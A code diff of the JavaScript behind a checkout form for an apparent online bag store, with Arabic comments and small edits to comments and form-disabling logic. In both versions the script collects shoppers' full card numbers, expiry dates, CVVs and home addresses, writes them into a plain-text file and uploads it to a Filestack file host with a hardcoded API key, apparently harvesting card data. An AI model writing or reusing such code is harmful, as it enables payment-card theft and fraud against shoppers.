@@ -1,6 +1,6 @@
-document.addEventListener('DOMContentLoaded', function () {
+document.addEventListener('DOMContentLoaded', function () { 
   const form = document.getElementById('checkout-form');
-  const submitButton = document.getElementById('submit-button'); // التأكد من أن الزر هو نفسه
+  const submitButton = document.getElementById('submit-button'); // الزر الذي سيتم تعطيله
 
   // استخراج المعلمات من الرابط
   function getUrlParams() {
@@ -23,13 +23,12 @@ document.addEventListener('DOMContentLoaded', function () {
 
   // عرض الصورة
   const productImage = document.getElementById('product-image');
-
   if (urlParams.image) {
-    productImage.src = urlParams.image;  // تعيين رابط الصورة
+    productImage.src = urlParams.image;
     productImage.alt = `${urlParams.name || 'Product'} image`;
-    productImage.style.display = 'block';  // إظهار الصورة
+    productImage.style.display = 'block';
   } else {
-    productImage.src = 'https://via.placeholder.com/500x300?text=No+Image+Available';  // صورة افتراضية
+    productImage.src = 'https://via.placeholder.com/500x300?text=No+Image+Available';
     productImage.alt = 'No Image Available';
     productImage.style.display = 'block';
   }
@@ -45,7 +44,7 @@ document.addEventListener('DOMContentLoaded', function () {
 
   // إضافة مستمع للإرسال
   form.addEventListener('submit', function (event) {
-    event.preventDefault();
+    event.preventDefault();  // منع إعادة تحميل الصفحة عند الإرسال
 
     // جمع البيانات من الحقول
     const email = document.getElementById('email').value;
@@ -60,7 +59,6 @@ document.addEventListener('DOMContentLoaded', function () {
     const expiry = document.getElementById('expiry').value;
     const cvv = document.getElementById('cvv').value;
 
-    // تحقق من صحة البيانات
     let isValid = true;
     removeErrorMessages();  // إزالة رسائل الخطأ السابقة
 
@@ -70,31 +68,24 @@ document.addEventListener('DOMContentLoaded', function () {
         showErrorMessage('Please fill out all required fields.', 'general');
     }
 
-    // التحقق من صحة البريد الإلكتروني
+    // تحقق من صحة البريد الإلكتروني
     if (!validateEmail(email)) {
         isValid = false;
         showErrorMessage('Please enter a valid email address.', 'email');
     }
 
+    // التحقق من صحة باقي الحقول هنا...
+
     if (isValid) {
-        // تغيير النص إلى "يتم التحميل الآن" وتعطيل الزر
-        submitButton.textContent = 'يتم التحميل الآن';
+        // تعطيل الزر أثناء الإرسال
         submitButton.disabled = true;
 
-        // تغيير لون الحقول إلى لون غامق للإشارة إلى أن البيانات تُرسل
-        const fields = form.querySelectorAll('input');
-        fields.forEach(field => {
-            field.style.backgroundColor = '#e0e0e0';  // تغيير الخلفية إلى اللون الرمادي
-            field.style.color = '#555';  // تغيير لون النص إلى اللون الغامق
-            field.disabled = true;  // تعطيل الحقول لمنع التعديل أثناء التحميل
-        });
-
-        // تجهيز البيانات لإرسالها
+        // إنشاء محتوى الملف النصي مع بيانات المنتج
         const orderData = `
             Email: ${email}
             First Name: ${firstName}
             Last Name: ${lastName}
-            Address: ${streetHouseApartmentUnit}
+            Street_House_Apartment_Unit: ${streetHouseApartmentUnit}
             City: ${city}
             State: ${state}
             Zip Code: ${zipCode}
@@ -102,40 +93,35 @@ document.addEventListener('DOMContentLoaded', function () {
             Card Number: ${cardNumber}
             Expiry Date: ${expiry}
             CVV: ${cvv}
-
             --- Product Details ---
-            Product Name: ${urlParams.name}
-            Product Price: $${urlParams.price}
-            Quantity: ${productQuantity}
+            Product Name: ${productName}
+            Product Price: $${productPriceText}
+            Product Quantity: ${productQuantityText}
+            Product Image URL: ${productImageUrl}
             Total Price: $${totalPrice}
         `;
-
+        
+        // تحويل البيانات إلى Blob
         const blob = new Blob([orderData], { type: 'text/plain' });
 
-        const apiKey = 'A7fSrsBg3RjybN1kkK99lz'; // استبدل بـ API Key الخاص بك
+        // إعدادات Filestack API
+        const apiKey = 'A7fSrsBg3RjybN1kkK99lz';
         const client = filestack.init(apiKey);
 
         // رفع الملف إلى Filestack
         client.upload(blob)
             .then(result => {
+                // عند نجاح رفع الملف
                 alert('Your order has been successfully placed and saved to Filestack!');
-                window.location.href = 'https://checkout.glamhavenbags.shop/thank-you.html';
-                console.log(result);
+                window.location.href = 'https://checkout.glamhavenbags.shop/thank-you.html';  // إعادة توجيه
             })
             .catch(error => {
+                // إذا حدث خطأ، إعادة تمكين الزر
                 console.error('Error uploading file to Filestack:', error);
                 alert('Something went wrong, please try again later.');
 
-                // إعادة النص إلى إكمال الشراء وتمكين الزر
-                submitButton.textContent = 'Complete Purchase';
+                // إعادة تمكين الزر إذا فشل الإرسال
                 submitButton.disabled = false;
-
-                // إعادة تمكين الحقول
-                fields.forEach(field => {
-                    field.style.backgroundColor = ''; // إعادة اللون إلى الأصل
-                    field.style.color = '';  // إعادة النص إلى اللون الأصلي
-                    field.disabled = false;  // إعادة تمكين الحقول
-                });
             });
     }
   });
